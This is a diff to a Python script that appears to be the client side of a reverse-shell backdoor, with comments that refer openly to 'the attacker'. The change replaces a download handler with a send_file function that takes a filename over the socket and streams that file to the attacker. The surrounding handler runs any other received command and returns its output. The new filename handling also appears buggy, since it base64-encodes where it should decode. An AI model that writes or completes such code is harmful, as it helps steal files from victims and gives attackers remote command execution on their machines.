@@ -16,8 +16,11 @@ def base64_encode(encode_message):
     return encoded_message
 
 # Function to handle file download (sending file to the attacker)
-def download_file(filename, conn):
+def send_file(conn):
+    filename = base64.b64encode(conn.recv(1024).decode('utf-8'))
+    print(f"The Filename is: {filename}")
     if os.path.exists(filename):
+
         with open(filename, 'rb') as file:
             #conn.sendall('Start Downloading...').encode('utf-8')  # Notify the attacker that file transfer is starting
             print('Start Download...')
@@ -54,9 +57,8 @@ def handle_commands(conn):
                 break
 
             # Handle file download request
-            elif command.startswith("download "):
-                filename = command.split(" ")[1]
-                download_file(filename, conn)  # Call download function and pass control
+            elif command.lower()=='download':
+                send_file(conn)  # Send the file to the attacker
 
             # For all other commands, execute and send result back to the attacker
             else:
